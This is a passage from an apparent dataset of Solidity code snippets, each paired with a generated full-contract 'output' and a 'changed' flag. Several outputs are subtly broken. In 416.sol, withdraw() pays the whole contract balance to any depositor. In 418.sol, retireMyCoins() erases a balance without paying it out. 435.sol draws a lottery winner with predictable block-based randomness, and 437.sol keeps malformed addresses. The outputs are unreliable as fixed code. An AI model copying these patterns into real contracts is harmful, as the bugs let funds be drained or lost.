        "input": "uint256[] public C;\nfunction setVal(string memory C_) public returns(uint[] memory ret1) {\n    bytes memory b = bytes(C_);\n    for (uint i = 0; i < b.length; i++) {\n        if (b[i] >= 0x30 && b[i] <= 0x39) {\n            C.push(uint256(uint8(b[i]) - 48));\n        }\n    }\n    return C;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256[] public C;\n\n    function setVal(string memory C_) public returns(uint[] memory) {\n        bytes memory b = bytes(C_);\n        for (uint i = 0; i < b.length; i++) {\n            if (b[i] >= 0x30 && b[i] <= 0x39) {\n                C.push(uint256(uint8(b[i]) - 48));\n            }\n        }\n        return C;\n    }\n}\n\n",
        "changed": 0
    },
    "414.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\n\ncontract StudentVotes {\n  Vote[] all_votes;\n\n  struct Vote_element {\n    string name;\n    uint numberOfVotes;\n  }\n\n  struct Vote{\n    string title;\n    address creator;\n    Vote_element[10] differentVotes;\n    bool done;\n  }\n\n  function createVote(string memory _title , string[] memory _elements) public {\n    Vote storage v = all_votes.push();\n    v.title = _title;\n    v.creator = msg.sender;\n    for(uint i = 0; i < _elements.length; i++)\n        v.differentVotes[i] = Vote_element(_elements[i], 0);\n    v.done = false;\n  }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\ncontract StudentVotes {\n  Vote[] all_votes;\n\n  struct Vote_element {\n    string name;\n    uint numberOfVotes;\n  }\n\n  struct Vote{\n    string title;\n    address creator;\n    Vote_element[10] differentVotes;\n    bool done;\n  }\n\n  function createVote(string memory _title , string[] memory _elements) public {\n    // Before initializing the variable into a struct, you must push the struct into\n    // Votes' array.\n    Vote storage v = all_votes.push();\n    // Then you can initialize the each variable into a struct\n    v.title = _title;\n    v.creator = msg.sender;\n    for(uint i = 0; i < _elements.length; i++)\n        v.differentVotes[i] = Vote_element(_elements[i], 0);\n    v.done = false;\n  }\n\n}\n\n",
        "changed": 0
    },
    "415.sol": {
        "input": "function SeeBalance(IERC20 token) public view returns (uint256) {\n   return IERC20(token).balanceOf(address(this));\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "416.sol": {
        "input": "struct Users {\n        uint dipositTime;\n        uint withDrawTime;\n        uint lastDepositTime;\n}\nmapping(address => Users ) users;\n\nfunction depositeTimeSet(uint t) {\n  users[msg.sender].dipositTime = t minutes;\n  withdrawalTimeSet(t);\n}\nfunction withdrawalTimeSet(uint t) {\n  users[msg.sender].withDrawTime = 3 * t minutes\n}\nfunction deposite() {\n  transferFrom(msg.sender,address(this));\n  depositeTimeSet(3); \n  users[msg.sender].lastDepositTime = now;\n}\nfunction withdraw() {\n  if(\n     now > users[msg.sender].lastDepositTime + \n     users[msg.sender].withDrawTime,\"too early for withdraw \n     request\"\n  )\n  transferFrom(address(this),msg.sender);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserContract {\n    struct Users {\n        uint dipositTime;\n        uint withDrawTime;\n        uint lastDepositTime;\n    }\n    \n    mapping(address => Users) users;\n\n    event Deposited(address indexed user, uint amount);\n    event Withdrawn(address indexed user, uint amount);\n\n    function depositTimeSet(uint t) public {\n        users[msg.sender].dipositTime = t * 1 minutes;\n        withdrawalTimeSet(t);\n    }\n    \n    function withdrawalTimeSet(uint t) public {\n        users[msg.sender].withDrawTime = 3 * t * 1 minutes;\n    }\n    \n    function deposit() public payable {\n        require(msg.value > 0, \"Deposit amount must be greater than 0\");\n        users[msg.sender].lastDepositTime = block.timestamp;\n        depositTimeSet(3); \n        emit Deposited(msg.sender, msg.value);\n    }\n    \n    function withdraw() public {\n        require(\n            block.timestamp > users[msg.sender].lastDepositTime + \n            users[msg.sender].withDrawTime,\n            \"Too early for withdraw request\"\n        );\n        uint amount = address(this).balance;\n        require(amount > 0, \"Insufficient funds\");\n        (bool success, ) = msg.sender.call{value: amount}(\"\");\n        require(success, \"Transfer failed.\");\n        emit Withdrawn(msg.sender, amount);\n    }\n}\n\n",
        "changed": 1
    },
    "417.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract EightFoundingFathers is ERC721A, Ownable, ReentrancyGuard {\n\n  string public        baseURI;\n  uint public          price             = 0.003 ether;\n  uint public          maxPerTx          = 20;\n  uint public          totalFree         = 1000;\n  uint public          maxSupply         = 1776;\n  uint256 public       maxFreePerWallet = 3;\n  bool public          mintEnabled;\n  mapping(address => uint256) private _mintedFreeAmount;\n\n  constructor() ERC721A(\"8Bit Founding Fathers\",\"8BFF\"){\n\n  }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "418.sol": {
        "input": "...\nmapping( address => uint ) balances;\nfunction sendToken(address user, uint amount) public payable {\n    balances[msg.sender] = amount;\n...\n}\n\nfunction retireMyCoins() public {\n   uint amountToWithdraw = balances[msg.sender]\n   balances[msg.sender] = 0; \n   msg.sender.transfer(amountToWithdraw); \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n    mapping(address => uint) public balances;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function sendToken(address user, uint amount) public {\n        require(amount <= balances[msg.sender], \"Not enough balance\");\n        balances[msg.sender] -= amount;\n        balances[user] += amount;\n        emit Transfer(msg.sender, user, amount);\n    }\n\n    function retireMyCoins() public {\n        uint amountToWithdraw = balances[msg.sender];\n        balances[msg.sender] = 0; \n        emit Transfer(msg.sender, address(0), amountToWithdraw);\n    }\n}\n\n",
        "changed": 1
    },
    "419.sol": {
        "input": "import \"./ContractA.sol\"\n\ncontract ContractB {\n   ContractA instanceOfA;\n   \n   function callA() public {\n       instanceOfA.variableYouWantToAccess();\n   }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "420.sol": {
        "input": "contract MultiToken is ERC1155 {\n    constructor(string memory uri) ERC1155(uri) payable {}\n}\n\nmultiToken = await factory.deploy(uri, {\n    value: ethers.utils.parseUnits(\"1\"), \n});\n\n\n",
        "output": "",
        "changed": 0
    },
    "421.sol": {
        "input": "compilesFiles = JSON.parse(solc.compile(JSON.stringify(input))).contracts[\n'Inbox.sol'\n].Inbox;\n\ncompilesFiles = JSON.parse(solc.compile(JSON.stringify(input))).contracts[\n'Inbox.sol'\n].basic;\n\nconst path = require('path');\nconst fs = require('fs');\nconst solc = require('solc');\nconst fsExtra = require('fs-extra')\n \nconst inboxPath = path.resolve(__dirname, 'contracts', 'Inbox.sol');\nconst source = fs.readFileSync(inboxPath, 'utf8');\n \nconst input = {\n    language: 'Solidity',\n    sources: {\n        'Inbox.sol': {\n            content: source,\n        },\n    },\n    settings: {\n        outputSelection: {\n            '*': {\n                '*': ['*'],\n            },\n        },\n    },\n};\n\nfunction writeOutput(compiled, buildPath) {\n    fsExtra.ensureDirSync(buildPath);\n\n    for (let contractFileName in compiled.contracts) {\n        const contractName = contractFileName.replace('.sol', '');\n        console.log('Writing: ', contractName + '.json');\n        fsExtra.outputJsonSync(\n            path.resolve(buildPath, contractName + '.json'),\n            compiled.contracts[contractFileName].basic\n        );\n    }\n}\n \n \ncompilesFiles = JSON.parse(solc.compile(JSON.stringify(input)));\nconst buildPath = path.resolve(__dirname, 'build');\nwriteOutput(compilesFiles, buildPath);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Inbox {\n    string public message;\n\n    function Inbox(string initialMessage) public {\n        message = initialMessage;\n    }\n\n    function setMessage(string newMessage) public {\n        message = newMessage;\n    }\n\n    function getMessage() public view returns (string) {\n        return message;\n    }\n}\n\n",
        "changed": 0
    },
    "422.sol": {
        "input": "pragma solidity ^0.8.7;\n\nstruct UserInfo{\n   uint id ;\n   string ime;\n}\n\ninterface IContract1{    \n    function arr(uint index) external returns(UserInfo memory );\n}\n\ncontract Contract2{\n    event UserEVENT (UserInfo UserInfo);\n    UserInfo [] public newarr;\n\n    function foo(address addr,uint i) external {\n        IContract1(addr).arr(i);\n        emit UserEVENT (IContract1(addr).arr(i));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.7;\n\nstruct UserInfo{\n   uint id ;\n   string ime;\n}\n\ninterface IContract1{    \n    function arr(uint index) external returns(UserInfo memory );\n}\n\ncontract Contract2{\n    event UserEVENT (UserInfo UserInfo);\n    UserInfo [] public newarr;\n\n    function foo(address addr,uint i) external {\n        IContract1(addr).arr(i);\n        emit UserEVENT (IContract1(addr).arr(i));\n    }\n}\n\n",
        "changed": 0
    },
    "423.sol": {
        "input": "function getdrugs(string memory _name) public view returns (Drug[] memory) {\n  Drug[] memory drugsToReturn = new Drug[](_getCount(_name));\n  uint256 index = 0;\n\n  for(uint i=0;i<counter;i++) {\n      if (keccak256(abi.encodePacked((drugs[i].name))) == keccak256(abi.encodePacked((_name)))){\n        drugsToReturn[index] = drugs[i];\n        index++;\n      }\n  }\n    \n  return drugsToReturn;\n}\n\nfunction _getCount(string memory _name) private view returns (uint256) {\n  uint256 count = 0;\n\n  for(uint i=0;i<counter;i++) {\n      if (keccak256(abi.encodePacked((drugs[i].name))) == keccak256(abi.encodePacked((_name)))){\n          count++;\n      }\n  }\n\n  return count;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DrugRegistry {\n    struct Drug {\n        string name;\n        uint256 price;\n    }\n\n    Drug[] private drugs;\n    uint256 private counter;\n\n    function addDrug(string memory _name, uint256 _price) public {\n        Drug memory newDrug = Drug({\n            name: _name,\n            price: _price\n        });\n        \n        drugs.push(newDrug);\n        counter++;\n    }\n\n    function getDrugs(string memory _name) public view returns (Drug[] memory) {\n        Drug[] memory drugsToReturn = new Drug[](_getCount(_name));\n        uint256 index = 0;\n\n        for(uint i=0;i<counter;i++) {\n            if (keccak256(abi.encodePacked((drugs[i].name))) == keccak256(abi.encodePacked((_name)))){\n                drugsToReturn[index] = drugs[i];\n                index++;\n            }\n        }\n        \n        return drugsToReturn;\n    }\n\n    function _getCount(string memory _name) private view returns (uint256) {\n        uint256 count = 0;\n\n        for(uint i=0;i<counter;i++) {\n            if (keccak256(abi.encodePacked((drugs[i].name))) == keccak256(abi.encodePacked((_name)))){\n                count++;\n            }\n        }\n\n        return count;\n    }\n}\n\n",
        "changed": 0
    },
    "424.sol": {
        "input": "function getCandidateInfo(uint _candidateId) public view returns (uint, \nstring memory, string memory) {\n\n    Candidate memory candidate=candidatesMap[_candidateId]\n    return(\n        candidate.candidateId,\n        candidate.CandidateName,\n        candidate.party\n    );\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Election {\n\n    struct Candidate {\n        uint candidateId;\n        string candidateName;\n        string party;\n    }\n\n    mapping(uint => Candidate) public candidatesMap;\n\n    function getCandidateInfo(uint _candidateId) public view returns (uint, string memory, string memory) {\n        Candidate memory candidate = candidatesMap[_candidateId];\n        return(\n            candidate.candidateId,\n            candidate.candidateName,\n            candidate.party\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "426.sol": {
        "input": "if (msg.sender != owner()) {\n        if (whitelisted[msg.sender] != true) {\n            if (presaleWallets[msg.sender] != true) {\n                require(msg.value >= cost * _mintAmount);\n            } else {\n                require(msg.value >= presaleCost * _mintAmount);\n            }\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenSale {\n    address private _owner;\n    uint256 private _cost;\n    uint256 private _presaleCost;\n\n    mapping(address => bool) public whitelisted;\n    mapping(address => bool) public presaleWallets;\n    \n    constructor (uint256 cost, uint256 presaleCost) {\n        _owner = msg.sender;\n        _cost = cost;\n        _presaleCost = presaleCost;\n    }\n\n    function buyTokens(uint256 _mintAmount) public payable {\n        if (msg.sender != _owner) {\n            if (!whitelisted[msg.sender]) {\n                if (!presaleWallets[msg.sender]) {\n                    require(msg.value >= _cost * _mintAmount, \"Insufficient funds sent\");\n                } else {\n                    require(msg.value >= _presaleCost * _mintAmount, \"Insufficient presale funds sent\");\n                }\n            }\n        }\n        // Continue the function to handle token transfer...\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n}\n\n",
        "changed": 0
    },
    "427.sol": {
        "input": "pragma solidity ^0.8.16;\n \nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n \ncontract MyVault is IERC721Receiver {\n    IERC20 immutable public erc20Token;\n    IERC721 immutable public erc721Collection;\n\n    uint256 constant public AMOUNT_OF_ERC20_PER_ERC721 = 1 * 1e18; \n\n    constructor(IERC20 _erc20Token, IERC721 _erc721Collection) {\n        erc20Token = _erc20Token;\n        erc721Collection = _erc721Collection;\n    }\n\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns(bytes4) {\n\n        bool success = erc20Token.transfer(_operator, AMOUNT_OF_ERC20_PER_ERC721);\n        require(success);\n\n        return this.onERC721Received.selector;\n    }\n\n    function erc20toErc721() external {\n        bool success = erc20Token.transferFrom(msg.sender, address(this), AMOUNT_OF_ERC20_PER_ERC721);\n        require(success);\n\n        uint256 tokenId = 1;\n\n        erc721Collection.safeTransferFrom(address(this), msg.sender, tokenId);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "428.sol": {
        "input": "    console.logBytes4(bytes4(keccak256(bytes(\"foo2(uint256)\")))); \n    console.logBytes(abi.encodeWithSignature(\"foo2(uint256)\")); \n    console.logBytes4(Token2.foo2.selector); \n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Token2 {\n    function foo2(uint256) external;\n}\n\ncontract MyContract {\n    function getFoo2Hash() public pure returns (bytes4){\n        return bytes4(keccak256(bytes(\"foo2(uint256)\")));\n    }\n\n    function getFoo2Encoded() public pure returns (bytes memory){\n        return abi.encodeWithSignature(\"foo2(uint256)\", 123);\n    }\n    \n    function getFoo2Selector(Token2 _token2) public pure returns (bytes4){\n        return _token2.foo2.selector;\n    }\n}\n\n",
        "changed": 0
    },
    "429.sol": {
        "input": "function _transfer(address sender, address recipient, uint256 amount) internal virtual override {\n    require(!_isBlackList[from] && !_isBlackList[to],\"You are black listed by Owner\");\n    super._transfer(sender, recipient, amount);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "430.sol": {
        "input": "pragma solidity ^0.8.19;\n\ncontract sendMonetSolidity {\n    receive() external payable {\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SendMoneySolidity {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    receive() external payable {\n    }\n    \n    function withdrawAllMoney() public {\n        require(msg.sender == owner, \"You are not the owner\");\n        payable(owner).transfer(address(this).balance);\n    }\n\n    function getBalance() public view returns(uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "431.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyNFTContract {\n    function transferToken() external payable {\n        require(msg.value == this.getPrice(), \"Incorrect value\");\n    }\n\n    function getPrice() external pure returns (uint256) {\n        return 0.5 ether;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyNFTContract {\n    function transferToken() external payable {\n        require(msg.value == this.getPrice(), \"Incorrect value\");\n        // ... \n    }\n\n    function getPrice() external pure returns (uint256) {\n        // can by also dynamic based on the token ID or any other on-chain param\n        return 0.5 ether;\n    }\n}\n\n",
        "changed": 0
    },
    "432.sol": {
        "input": "mapping(address => mapping(uint256 => string)) tokenURIs;\n\nmapping(address => string[]) tokenURIsByAddress;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenURIManager {\n    mapping(address => mapping(uint256 => string)) public tokenURIs;\n    mapping(address => string[]) public tokenURIsByAddress;\n\n    function setTokenURI(address _owner, uint256 _tokenId, string memory _uri) public {\n        tokenURIs[_owner][_tokenId] = _uri;\n        tokenURIsByAddress[_owner].push(_uri);\n    }\n\n    function getTokenURI(address _owner, uint256 _tokenId) public view returns (string memory) {\n        return tokenURIs[_owner][_tokenId];\n    }\n\n    function getTokenURIsByAddress(address _owner) public view returns (string[] memory) {\n        return tokenURIsByAddress[_owner];\n    }\n}\n\n",
        "changed": 0
    },
    "435.sol": {
        "input": "contract lotteryProject\n{\naddress public  owner;\naddress public addressofwinner;   \n\naddress payable []  public  part;\nreceive() external payable virtual {}\nuint value;\nconstructor()\n{\n    owner=msg.sender;\n}\n\nfunction depositEthers() public payable{\n    require( msg.value==10 ether , \" 2Ethers are required to participate in this lottery: \");\n    part.push(payable(msg.sender));\n}\n\nfunction totalDeposits()public view returns(uint)\n{   \n    require (msg.sender== owner, \"Only owner is \n        authorized to chech the total deposits\");\n    return address(this).balance;\n}\n\nfunction random()public view returns (uint) \n{\n    require(msg.sender==owner);\n    return uint(keccak256(abi.encodePacked(block.prevrandao,\n         block.timestamp , part.length)));\n\n}\n\nfunction winner()public\n{\n    require(msg.sender==owner);\n    require(part.length>=3);\n\n    uint r = random();\n     \n    uint index = r % part.length;\n    address payable  won ;\n    won= part[index]; \n    addressofwinner=won;              \n    won.transfer(totalDeposits());\n    part= new address payable[](0);   \n     } \n   }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract LotteryProject {\n    address public owner;\n    address public addressofwinner;\n    address payable[] public participants;\n    \n    receive() external payable {}\n    \n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function depositEthers() public payable {\n        require(msg.value == 10 ether, \"10 ethers are required to participate in this lottery\");\n        participants.push(payable(msg.sender));\n    }\n\n    function totalDeposits() public view returns (uint) {\n        require(msg.sender == owner, \"Only owner is authorized to check the total deposits\");\n        return address(this).balance;\n    }\n\n    function random() private view returns (uint) {\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, participants.length)));\n    }\n\n    function winner() public {\n        require(msg.sender == owner);\n        require(participants.length >= 3);\n\n        uint r = random();\n        uint index = r % participants.length;\n        address payable winner = participants[index];\n        addressofwinner = winner;\n        winner.transfer(totalDeposits());\n        participants = new address payable[](0);\n    }\n}\n\n",
        "changed": 0
    },
    "436.sol": {
        "input": "    address constant public BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;\n\nIERC20 public immutable BUSD =\n    IERC20(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    // BUSD token address\n    address constant public BUSD_ADDRESS = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;\n    \n    // BUSD token interface\n    IERC20 public immutable BUSD;\n    \n    constructor() {\n        BUSD = IERC20(BUSD_ADDRESS);\n    }\n\n    function checkBalance() public view returns (uint256) {\n        return BUSD.balanceOf(address(this));\n    }\n    \n    function transferBUSD(address _to, uint256 _amount) public returns (bool) {\n        require(BUSD.balanceOf(address(this)) >= _amount, \"Not enough tokens in contract\");\n        return BUSD.transfer(_to, _amount);\n    }\n}\n\n",
        "changed": 0
    },
    "437.sol": {
        "input": "struct NFT {\n    string contractAddress;\n    uint256 tokenID;\n    string tokenStandard;\n    string blockChain;\n    uint256 creatorFees;\n}\n\nNFT nftOne = NFT(\"0xD9D24a4b8A58BCdBfDDd0d27B51F27\", 345,\"ERC-721\", \"ETHEREUM\", 721);\nNFT nftTwo = NFT(\"0xD9824a4b8A5u8CdBfDDd0d27B51F27\", 346,\"ERC-721\", \"ETHEREUM\", 721);\nNFT nftThree = NFT(\"0xD9DE9824a4b8A58BCdBfDDd0Y1F27\", 347,\"ERC-721\", \"ETHEREUM\", 721);\n\nNFT[] nftArray;\n\nconstructor() {\n    nftArray.push(nftOne);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NFTContract {\n    struct NFT {\n        string contractAddress;\n        uint256 tokenID;\n        string tokenStandard;\n        string blockChain;\n        uint256 creatorFees;\n    }\n\n    NFT nftOne = NFT(\"0xD9D24a4b8A58BCdBfDDd0d27B51F27\", 345,\"ERC-721\", \"ETHEREUM\", 721);\n    NFT nftTwo = NFT(\"0xD9824a4b8A5u8CdBfDDd0d27B51F27\", 346,\"ERC-721\", \"ETHEREUM\", 721);\n    NFT nftThree = NFT(\"0xD9DE9824a4b8A58BCdBfDDd0Y1F27\", 347,\"ERC-721\", \"ETHEREUM\", 721);\n\n    NFT[] public nftArray;\n\n    constructor() public {\n        nftArray.push(nftOne);\n        nftArray.push(nftTwo);\n        nftArray.push(nftThree);\n    }\n}\n\n",
        "changed": 0
    },
    "438.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract MappingInFunction {\n    mapping (uint => string) public Names;\n    uint public counter;\n   \n    function addToMappingInsideFunction(string memory name) public returns (string memory localName)  {\n        mapping (uint => string) storage localNames = Names;\n        counter+=1;\n        localNames[counter] = name;\n        return localNames[counter];\n\n}\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0 <0.9.0;\n\ncontract MappingInFunction {\n    mapping (uint => string) public Names;\n    uint public counter;\n   \n    function addToMappingInsideFunction(string memory name) public returns (string memory localName)  {\n        mapping (uint => string) storage localNames = Names;\n        counter+=1;\n        localNames[counter] = name;\n        return localNames[counter];\n\n        // we cannot return mapping in solidity\n        // return localNames;\n}\n\n}\n\n",
        "changed": 0
    },
    "439.sol": {
        "input": "function readAllTask() public view returns (Task[] memory) {\n    return tasks;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TaskContract {\n    struct Task {\n        uint id;\n        string content;\n        bool completed;\n    }\n\n    Task[] public tasks;\n\n    function createTask(string memory _content) public {\n        tasks.push(Task(tasks.length, _content, false));\n    }\n\n    function readAllTask() public view returns (Task[] memory) {\n        return tasks;\n    }\n\n    function completeTask(uint _id) public {\n        Task memory _task = tasks[_id];\n        _task.completed = true;\n        tasks[_id] = _task;\n    }\n}\n\n",
        "changed": 0
    },
    "443.sol": {
        "input": "contract RemoveByIndex {\n   uint[] public payees = [1, 2, 3, 4, 5];\n    function removeByIndex(uint index) public returns(uint[] memory){\n        uint lastPayeeIndex=payees.length-1;\n        uint lastPayeeId=payees[lastPayeeIndex];\n        payees[index]=lastPayeeId;\n        payees.pop();\n         return payees ;\n    }\n}\n\n [1, 5, 3, 4, 5]\n\n [1, 5, 3, 4]\n\ncontract RemoveByIndex {\n   uint[] public payees = [1, 2, 3, 4, 5];\n   mapping (uint=>uint) public idToIndex; \n   function populateMapping() public {\n        idToIndex[1]=0;\n        idToIndex[2]=1;\n        idToIndex[3]=2;\n        idToIndex[4]=3;\n        idToIndex[5]=4;\n    }\n    function removeByIndex(uint index) public returns(uint[] memory){\n        uint lastPayeeIndex=payees.length-1;\n        uint lastPayeeId=payees[lastPayeeIndex];\n        uint idToBeRemoved=payees[index];\n        payees[index]=lastPayeeId;\n        idToIndex[lastPayeeId]=index;\n        delete idToIndex[idToBeRemoved];\n        payees.pop();\n        return payees ;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RemoveByIndex {\n   uint[] public payees = [1, 2, 3, 4, 5];\n   mapping (uint => uint) public idToIndex; \n\n   constructor() public {\n        populateMapping();\n    }\n\n   function populateMapping() public {\n        for(uint i = 0; i < payees.length; i++) {\n            idToIndex[payees[i]]=i;\n        }\n    }\n\n    function removeByIndex(uint index) public returns(uint[] memory){\n        require(index < payees.length, \"Index out of bounds\");\n\n        uint lastPayeeIndex = payees.length - 1;\n        uint lastPayeeId = payees[lastPayeeIndex];\n        uint idToBeRemoved = payees[index];\n        payees[index] = lastPayeeId;\n        idToIndex[lastPayeeId] = index;\n        delete idToIndex[idToBeRemoved];\n        payees.pop();\n        return payees ;\n    }\n}\n",
        "changed": 0
    },
    "444.sol": {
        "input": "pragma solidity ^0.4.18; \n\ncontract lottery{\n    uint public lastTicketNumber = 0;\n    uint youEntredWithAmount;\n    address [] public players;\n    uint public entryFee =  0.01 ether;\n    \n    struct UserInfo {\n        uint userFstTcktNumber;\n        uint userLstTcktNumber;\n    }\n    \n    mapping(address => UserInfo ) public entry;\n    \n    function letsdo(uint first, uint last) public{\n        players.push(msg.sender);\n        entry[msg.sender].userFstTcktNumber = first;\n        entry[msg.sender].userLstTcktNumber = last;\n    }\n    \n    function currentLevel(address userAddress) public constant returns (uint, uint) {\n        return (entry[userAddress].userFstTcktNumber, entry[userAddress].userLstTcktNumber);\n    }\n    \n \n      \n      function numberOfParticipents() public view returns(address [] memory){\n          return players;\n      }\n}\n\n\n\n",
        "output": "pragma solidity ^0.4.18; \n\ncontract lottery{\n    uint public lastTicketNumber = 0;\n    uint youEntredWithAmount;\n    address [] public players;\n    uint public entryFee =  0.01 ether;\n    \n    struct UserInfo {\n        uint userFstTcktNumber;\n        uint userLstTcktNumber;\n    }\n    \n    mapping(address => UserInfo ) public entry;\n    \n    function letsdo(uint first, uint last) public{\n        players.push(msg.sender);\n        entry[msg.sender].userFstTcktNumber = first;\n        entry[msg.sender].userLstTcktNumber = last;\n    }\n    \n    function currentLevel(address userAddress) public constant returns (uint, uint) {\n        return (entry[userAddress].userFstTcktNumber, entry[userAddress].userLstTcktNumber);\n    }\n    \n \n      \n      function numberOfParticipents() public view returns(address [] memory){\n          return players;\n      }\n}\n\n\n",
        "changed": 0
    },
    "445.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"hardhat/console.sol\";\n\ncontract ContractA {\n    event Received(address sender, uint value);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n    function deposit() public payable{\n        require(msg.value >= 0, \"Value amount to be deposit\");\n        withdraw(msg.value);\n    }\n\n    function withdraw(uint256 _amount) internal{\n        console.log(_amount);\n        uint256 amount = 2 * _amount; \n        console.log(amount);\n        payable(msg.sender).transfer(amount);\n    }\n}\n\nimport { ethers } from \"hardhat\";\n\nconst hre = require(\"hardhat\");\nasync function main() {\n  const [owner] = await hre.ethers.getSigners();\n\n  const deposit = await ethers.getContractFactory(\"ContractA\");\n  const depositInstance = await deposit.deploy();\n  await depositInstance.deployed();\n\n  const depositContract = await hre.ethers.getContractFactory(\"ContractA\");\n  const instance = await depositContract.attach(`${depositInstance.address}`);\n\n  const contractBalance = await hre.ethers.provider.getBalance(\n    `${depositInstance.address}`\n  );\n  console.log(\"contract balance before tx\", contractBalance.toString());\n\n  await owner.sendTransaction({\n    to: depositInstance.address,\n    value: ethers.utils.parseUnits(\"100\", 18),\n  });\n  const contractBalanceAfter = await hre.ethers.provider.getBalance(\n    `${depositInstance.address}`\n  );\n  console.log(\"contract balance after tx\", contractBalanceAfter.toString());\n\n  const ownerBalance = await hre.ethers.provider.getBalance(`${owner.address}`);\n  console.log(\n    `Owner balance before deposit ${ethers.utils.formatUnits(\n      ownerBalance.toString(),\n      18\n    )}`\n  );\n  await instance\n    .connect(owner)\n    .deposit({ value: ethers.utils.parseUnits(\"5\", 18) });\n\n  const contractBalanceAfterContract = await hre.ethers.provider.getBalance(\n    `${depositInstance.address}`\n  );\n  console.log(\n    \"contract after contract interaction\",\n    contractBalanceAfterContract.toString()\n  );\n\n  const ownerBalanceAfter = await hre.ethers.provider.getBalance(\n    `${owner.address}`\n  );\n  console.log(\n    `Owner balance before deposit ${ethers.utils.formatUnits(\n      ownerBalanceAfter.toString(),\n      18\n    )}`\n  );\n}\nmain().catch((error) => {\n  console.error(error);\n  process.exitCode = 1;\n});\n\nCompiled 1 Solidity file successfully\ncontract balance before tx 0\ncontract balance after tx 100000000000000000000\nOwner balance before deposit 9899.999469435601476844\n5000000000000000000\n10000000000000000000\ncontract after contract interaction 95000000000000000000\nOwner balance before deposit 9904.999416266040763879\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract ContractA {\n    event Received(address sender, uint value);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n    function deposit() public payable{\n        require(msg.value > 0, \"Value amount to be deposit\");\n        withdraw(msg.value);\n    }\n\n    function withdraw(uint256 _amount) internal{\n        msg.sender.transfer(_amount);\n    }\n}\n\n",
        "changed": 0
    },
    "446.sol": {
        "input": "contract MyContract is ERC20, Ownable {\n\n   function myFunction() public {\n      ...\n   }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "447.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256[] numbers;\n\n    constructor() {\n        numbers.push(123);\n        numbers.push(456);\n    }\n\n    function getNumbers() public view returns (uint256[] memory) {\n        return numbers;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256[] numbers;\n\n    constructor() {\n        numbers.push(123);\n        numbers.push(456);\n    }\n\n    function getNumbers() public view returns (uint256[] memory) {\n        return numbers;\n    }\n}\n\n",
        "changed": 0
    },
    "449.sol": {
        "input": "Player storage newestplayer = players[len-1];\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Game {\n    struct Player {\n        address playerAddress;\n        string playerName;\n        uint playerScore;\n    }\n\n    Player[] public players;\n\n    function addPlayer(address _playerAddress, string memory _playerName, uint _playerScore) public {\n        players.push(Player(_playerAddress, _playerName, _playerScore));\n    }\n    \n    function getNewestPlayer() public view returns (address, string memory, uint) {\n        uint len = players.length;\n        require(len > 0, \"No players in the game yet.\");\n        Player storage newestPlayer = players[len-1];\n        return (newestPlayer.playerAddress, newestPlayer.playerName, newestPlayer.playerScore);\n    }\n}\n\n",
        "changed": 0
    },
    "450.sol": {
        "input": "payable(address(this)).transfer(msg.value);\n\n\n",
